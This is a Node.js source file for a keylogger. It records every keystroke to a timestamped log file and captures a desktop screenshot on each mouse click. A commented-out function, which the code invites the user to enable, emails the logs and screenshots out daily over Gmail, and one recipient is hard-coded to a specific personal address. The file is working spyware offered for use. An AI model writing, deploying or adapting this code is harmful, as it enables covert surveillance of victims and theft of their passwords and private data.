const iohook = require("iohook");
const fs = require("fs");
const screenshot = require("desktop-screenshot");
const nodemailer = require("nodemailer");

let text = "";
let date;
let index = 1;
let logFlag = false;
let screenFlag = false;

function newDate() {
  let timeNow = new Date();
  let day = timeNow.getDate();
  let month = timeNow.getMonth();
  let year = timeNow.getFullYear();
  let hours = timeNow.getHours();
  let minutes = timeNow.getMinutes();
  let seconds = timeNow.getSeconds();
  let timeString = "";
  timeString += `${day}.${month + 1}.${year}. `;
  timeString += hours > 12 ? hours - 12 : hours;
  timeString += (minutes < 10 ? ":0" : ":") + minutes;
  timeString += (seconds < 10 ? ":0" : ":") + seconds;
  timeString += hours >= 12 ? " P.M." : " A.M.";
  date = timeString;
  text += `\n${date}: `;
  setTimeout(newDate, 10000);
}

newDate();

iohook.on("keydown", (evt) => {
  let keys = String.fromCharCode(evt.rawcode);
  text += keys;
  fs.writeFileSync(`${__dirname}/logs.txt`, text);
  logFlag = true;
});

iohook.on("mousedown", (evt) => {
  screenshot(`${__dirname}/screenshots/screenshot${index}.jpg`, function (
    err,
    succ
  ) {
    if (err) {
      console.log("Error: " + err);
    } else {
      console.log("Success");
    }
  });
  screenFlag = true;
  index++;
});

//Uncomment sendMail function and add email and password if you wish keylogger to send mail daily

// function sendMail() {
//   let transporter = nodemailer.createTransport({
//     service: "Gmail",
//     auth: {
//       user: "", //your gmail username
//       pass: "", //your gmail password
//     },
//   });

//   if (logFlag) {
//     let info = transporter.sendMail({
//       from: "Keylogger",
//       to: "", //your gmail username
//       subject: "Logs",
//       attachments: [
//         {
//           filename: "logs.txt",
//           path: `${__dirname}/logs.txt`,
//         },
//       ],
//     });
//   }

//   if (screenFlag) {
//     for (let i = 1; i <= index; i++) {
//       let info2 = transporter.sendMail({
//         from: "Keylogger",
//         to: "markonina12@gmail.com",
//         subject: "screens",
//         attachments: [
//           {
//             filename: `screenshot${i}.jpg`,
//             path: `${__dirname}/screenshots/screenshot${i}.jpg`,
//           },
//         ],
//       });
//     }
//   }
// }

// setTimeout(sendMail, 86400000);

iohook.start();
